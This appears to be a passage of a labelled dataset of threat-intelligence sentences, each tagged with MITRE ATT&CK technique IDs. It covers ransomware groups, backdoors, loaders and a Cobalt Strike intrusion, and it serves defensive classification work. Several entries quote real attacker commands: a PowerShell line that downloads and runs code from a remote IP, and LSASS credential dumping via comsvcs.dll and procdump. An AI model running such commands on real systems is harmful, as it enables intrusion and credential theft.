    "type": "text",
    "text": "The ProcessWorm achieves stealth by hooking low-level API functions (such as NtEnumerateValueKey or NtQuerySystemInformation) ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The rest of the malicious activity is dispersed across hooks of various WinAPI functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Examples of such information are typed keystrokes or documents sent to the printer. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Plugin type and ID Features FileManager (0x02) Upload, download, search, delete files.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Create file listing recordings CommandShell (0x04) Create remote shell sessions TaskScheduler (0x05) Create different types of recordings (file listings, microphone, screen, webcam) at a specified time by dispatching commands to appropriate plugins MicRecorder (0x10) Livestream the victim’s microphone or capture its recordings. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Intercept Skype contacts, chats, calls and transferred files FileModificationRecorder (0x16) Record files which have been modified FileAccessRecorder (0x17) Record files which have been accessed PrintedFilesRecorder (0x18) Steal files which are printed by the victim FileDeletionRecorder (0x19) Record removed files ForensicLauncher (0x20) Gather forensic data by downloading and executing specific utilities.",
    "command": "",
    "labels": [
      "T1005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As mentioned in our previous report detailing emerging ransomware families in 2021, HelloKitty features multiple flags that could be set as command line arguments, which are detailed in Table 1 of the linked report. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the ransomware binary deletes itself and drops a ransom note on the victim machine’s desktop titled !!!",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Additional execution details include the following: Creating the HKCU\\Software\\Zeppelin registry key Appending an extension with the format A1A-A80-4CD to encrypted files Creating a file called README.txt.v-society Imphash: 8acb34bed3caa60cae3f08f75d53f727 Creating a temp file with a .Zeppelin extension using the following format - C:\\Users\\<User>\\AppData\\Local\\Temp\\7D3ED7F1.Zeppelin Conclusion School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable to threat actors.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "T1078 Valid Accounts Compromised valid credentials have been used by Vice Society to gain initial access. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "TA0002 Execution T1047 Windows Management Instrumentation (WMI) Malicious commands are executed via WMI as a means of “living off the land” and avoiding detection. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Scheduled Task/Job Vice Society is known to execute commands via scheduled tasks/jobs. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Command Shell Batch files are used by Vice Society to deploy the ransomware via PsExec. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "T1547.001 Registry Run Keys/Startup Folder Persistence is maintained after boot/reboot via malicious autostart registry keys. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "T1055 Process Injection Legitimate processes have been corrupted by Vice Society via code injection, as a means to evade defenses. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "T1112 Modify Registry Vice Society attempts to disable Windows Defender by modifying the Registry. ",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Impair Defenses: Disable or Modify Tools Attempts to disable or modify endpoint security, such as Microsoft Defender, on compromised devices. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "T1003.001 OS Credential Dumping: LSASS Memory Vice Society utilizes comsvcs.dll to dump credentials from Local Security Authority Subsystem Service. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Remote Services RDP is used by the group for lateral movement. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The two attack chains used by the Mint Sandstorm subgroup Attack chain 1: The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users’ accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "In cases where users’ credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The actors could also gain access to other systems where individuals may have reused their passwords. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Since 2022,Microsoft has observed this Mint Sandstorm subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Soldier: Soldier is a multistage .NET backdoor with the ability to download and run additional tools and uninstall itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CharmPower can read files, gather information on an infected host, and send details back to the attackers. ",
    "command": "",
    "labels": [
      "T1005",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "In addition, Microsoft Sentinel customers can leverage the following content to hunt for and detect related activity in their environments: Log4J solution Potential Impacket Execution Commands executed by WMI on new hosts – potential Impacket Scheduled Task Hidden Remote Task Creation/Update using Schtasks Process Scheduled Task Creation or Update from User Writable Directory Exchange SSRF Autodiscover ProxyShell – Detection Indicators of compromise IndicatorTypeDescriptionSoldier.exeFile nameSoldier backdoorad55b4a40f9e52682d9d4f069914e09c941e8b77ca7b615e9deffccdfbc54145SHA256Soldier backdoor hashDrokbk.exeFile nameDrokbk backdoor64f39b85c1d784df1ca8eb895ac7eaf47bf39acf008ed4ae27a796ac0f841bSHA256Drokbk",
    "command": "",
    "labels": [
      "T1047",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It then calls CallWindowProcW API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Patch DbgBreakPoint and DbgUiRemoteBreakin API used by debuggers. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Uses EnumWindows API to enumerates windows. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Uses NtSetInformationThread API with ThreadHideDebugger(0x11). ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Uses EnumDeviceDrivers and GetDeviceDriverBaseNameA APIs. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Uses MsiEnumProductsA and MsiGetProductInfoA APIs. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Uses OpenSCManagerA and EnumServicesStatusA APIs. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "It decrypts an encrypted payload, use process hollowing to inject decrypted payload into child process and resolves its Import Address Table. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lastly, it starts payload execution using the ZwCreateThreadEx API. Fig 4.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "GuLoader call RtlAddVectoredExceptionHandler API to add its custom Vectored Exception Handler. RtlAddVectoredExceptionHandler accepts two parameters. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The data in the HTTP body is the same as the past variant, which has the same magic bytes 17 03 03 and the encrypted victim information.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "C&C traffic of the PUBLOAD HTTP variant Once the payload is received, it will check if the first three magic bytes are 17 03 03 and if the following two bytes are the size of payload.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first payload retrieved from the PUBLOAD HTTP variant After decryption, it then checks if the first byte of the decrypted payload is 0x06.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The second payload retrieved from the PUBLOAD HTTP variant After this is decrypted, there is yet another final backdoor payload that supports data upload and command execution. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The final payload of the PUBLOAD HTTP variant Command Internal string 0x03 - 0x01 - 0x1B UploadBegin error : %d! 0x1D UploadData error : %d! 0x1A - 0x1E CmdStart error : %d! 0x1F CmdWrite error :",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Command codes in the PUBLOAD HTTP variant In addition, we found some interesting debug strings and event names among the PUBLOAD samples. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Discovery Once the threat actors obtain access to the victim’s environment, they can start inspecting the environment via the following commands: net user net user <username> net user <username>",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "￼ This tool accepts an argument, and the following data is written into registry: Registry Key Name Value HKEY_USERS\\<SID>-1001_Classes\\aaabbb32\\shell\\open\\command (Default) ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Registry keys changed by ABPASS ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It also sets up a new ProgID aaabbb32 and its shell open command.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The hack tool CCPASS works as follows: It disables the application association toasts for the protocol ms-windows-store. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It creates a new Shell in the registry. ",
    "command": "",
    "labels": [
      "T1106",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It invokes the undocumented API UserAssocSet to update the file association. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Lateral movement In this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed by Mandiant and Sophos) being used to install themselves to removable disks and create a reverse shell. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "If it is not installed, it installs itself to %programdata% and then sets the registry run key for persistence. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It will then create a reverse shell via ncat.exe to the server closed[.]theworkpc[.]com. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91. Figure 19.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The certutil.exe program downloads the WinRAR binary We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.]181 for future use. Figure 20.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell downloading malware In certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is a simple backdoor that is capable of executing commands and clearing event logs. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The second is under winver.exe, which is injected to conduct backdoor behaviors.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "There are three conditions different ways to decide the method of installation for COOLCLIENT, detailed here: It installs itself by creating an InstallSvc service called InstallSvc which will trigger “googleupdate.exe work”.. ",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It sets up a run key for via the command C:\\ProgramData\\GoogleUpdate\\googleupdate.exe work for persistence. work.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next-stage payload (COOLCLIENT), which contains malicious behaviors. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings dbg.exe or olly. Figure 27.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "There are two waysto determine the method of installation for TROCLIENT, detailed here: It installs itself by creating aservice called InstallSvc which will trigger “C:\\programdata\\netsky\\netsky.exe online”. ",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It sets up a run key for the command C:\\programdata\\netsky\\netsky.exe online for persistence. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe. passuac:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Argument/Behaviors COOLCLIENT TROCLIENT install Creates a service named InstallSvc ✓ ✓ Executes itself with passuac ✓ ✓ Sets Run Key with “work/online” ✓ ✓ passuac AppInfo RPC ✓ CMSTPLUA COM ✓ ✓ Token manipulation ✓ work/online Send portmap ✓ Connect to C&C ✓ ✓ File operations ✓ ✓ Keylogging ✓ ✓ Table 3.",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It seems that the threat actors are continuously updating this tool to provide more flexibility and lower the possibility of detection, including adding more command-line arguments and obfuscation mechanisms.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An example of a ZPAKAGE password ZPAKAGE also supports command-line arguments, but it possesses less functions than NUPAKAGE.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Screenshot of the Google Drive link The new arrival vector flow is similar to the one we introduced in the arrival vector section: Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Exe, found in the Documents.rar archive, is a novel malware that communicates over the MQTT protocol.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the other hand, there are loaders that serve as the first stage of the attack, the payload of the malware can be part of the loader’s file or it can be downloaded from a remote location (by the loader, also known as a Downloader).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "To make all of these actions, the program must use system calls because these actions require interaction with the kernel. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The relevant system calls are VirtualAlloc used for allocating memory in the current process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Knowing the size can help identify when a program allocates big memory space, possibly for the unpacked payload. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "VirtualProtect changes the permissions of the given virtual address.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "When malware wants to grant write or execute permissions flNewProtect argument will be set to PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20). ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "RtlDecompressBuffer decompresses the provided buffer. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "CreateProcessInternalW creates a new process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Our follow-up analysis discovered that firmware in Gigabyte systems is dropping and executing a Windows native executable during the system startup process, and this executable then downloads and executes additional payloads insecurely.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Key Findings There are two important aspects of our findings: Eclypsium automated heuristics detected firmware on Gigabyte systems that drops an executable Windows binary that is executed during the Windows startup process. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This executable binary insecurely downloads and executes additional payloads from the Internet. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Although this setting appears to be disabled by default, it was enabled on the system we examined. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location: ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "%SystemRoot%\\system32\\GigabyteUpdateService.exe It then sets registry entries to run this executable as a Windows Service.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Stage 2: Downloading and running further executables ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It downloads and runs an executable payload from one of the following locations, depending on how it’s been configured: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Plain HTTP (the first bullet above) should never be used for updating privileged code as it is easily compromised via Machine-in-the-middle (MITM) attacks.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "However, we noticed that even when using the HTTPS-enabled options, remote server certificate validation is not implemented correctly.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Base64 encoded RAT execution command The command decodes to look similar to the following: NetSupport RAT decoded command Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In addition, the sample generates a scheduled task with multiple triggers. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "NetSupport RAT Persistence via Scheduled Task Install directory of NetSupport RAT The RAT performs a number of discovery operations to understand its host environment.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Network adapter details are pulled via GetAdaptersAddresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Additional data is gleaned via WMI queries such as: SELECT *",
    "command": "",
    "labels": [
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FROM Win32_ComputerSystem SELECT *",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The malware deploys some anti-analysis measures such as attempting to detect the presence of a debugger via IsDebuggerPresent, and all running processes are enumerated and logged via EnumProcesses (32-bit processes).",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "NetSupport RAT has the ability to drop and execute additional components.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These files are all self-deleted after launch or full installation of the attacker configuration.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In addition, threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "RapperBot then determines the processor architecture and infects the device.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If for some reason these methods don’t work, then a malware downloader is uploaded to the device via the shell “echo” commands. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Is able to do a “stealthy” infection. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Is able to steal/gather information on CPU type, screen resolution, supported wallets, and so on. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In case all checks are passed, the malware: Reconfigures Windows Defender to exclude the user profile path and the entire system drive from scanning. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Creates empty files and subdirectories in %ProgramData%\\HostData to make the directory look benign. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Downloads the miner and watcher. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In this latest campaign, threat actors are relying on compromised websites to socially engineer users by using a decoy forum template instructing them to download a malicious file. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The infection process starts once the victim executes a malicious script inside the zip archive they just downloaded. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The following diagram shows a high level overview: Figure 5: Infection flow Stage 1 – The first JavaScript The first JavaScript is the module that has to be manually executed by the victim, and it has been obfuscated in order to hide its real intentions.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Block 1 is responsible for reading/writing registry keys under “HKEY_CURRENT_USER\\SOFTWARE\\<script-specific name>”.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The differentiation between the variants starts in the next part, which is another JavaScript fetched from the C2 server. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 9: GET request with C2 server After conversion to ASCII, the next JavaScript is revealed, and the code is executed.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Example for the Gootkit variant (commented, full) Figure 10: The downloaded JavaScript The downloaded code chunk is responsible for installing the persistent elements.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Execution of the second stage JavaScript leads to the payload being written to the registry, as a list of keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Deploying the payload The loader runs to the next stage with the help of Process Hollowing – one of the classic methods of PE injection. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This function loads another PE, that is embedded inside as a base64 encoded buffer: Figure 20: Another buffer Figure 21: Deploying the payload This time the loader uses another method of PE injection, manual loading into the parent process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These messages used Microsoft OneNote attachments (.one) to execute a malicious HTA file that, in turn, runs a PowerShell command which fetches IcedID from a remote resource.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When the user double clicks or opens the lnk file, they inadvertently starts a hidden file in the directory, a DLL (namr.dll) containing the Bumblebee malware loader.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Four hours after initial access, the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After injecting into various processes on the host, the threat actors executed the PowerShell script Invoke-Kerberoast.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These batch scripts’ purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\System32\\cmd.exe /c start rundll32 namr.dll,IternalJob Running Eric Zimmerman’s tool LECmd revealed additional details related to the threat actors.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The metadata included TA machine’s hostname, MAC address, and the LNK document creation date: Execution Execution of multiple payloads The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.",
    "command": "",
    "labels": [
      "T1016",
      "T1082",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into: Sysmon File Created event showing wab.exe created by rundll32.exe Sysmon Event Code 1 showing wab.exe executed by WMI Execution of Cobalt Strike The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory: C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1047",
      "T1055",
      "T1059.003",
      "T1105",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "powershell.exe -nop",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "-w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))\" Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Persistence AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Privilege Escalation GetSystem Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "cbdhsvc , a process where Cobalt Strike was injected into: C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "getsystem ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender’s Guide blog post. Valid Accounts Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "A service account, with Domain Administration permissions, was used to create a remote service on a Domain Controller to move laterally. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Defense Evasion Process Injection The process injection technique was used multiple times to inject into different processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe: Threat actors also created a remote thread in svchost.exe: Multiple processes were then spawned by : C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts as well. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process: Credential Access LSASS Dump MiniDump Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "-s cbdhsvc beacon: cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 968 C:\\ProgramData\\REDACTED\\lsass.dmp full ProcDump Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder: ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The ProcDump utility was executed on those workstations using the following command line: C:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp Kerberoasting Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected: Here is an extract of PowerShell EventID",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Around 3 hours later, the service account logged into one of the Domain Controllers from the beachhead. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Network scanning Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files: s.bat script: @echo off for /f",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
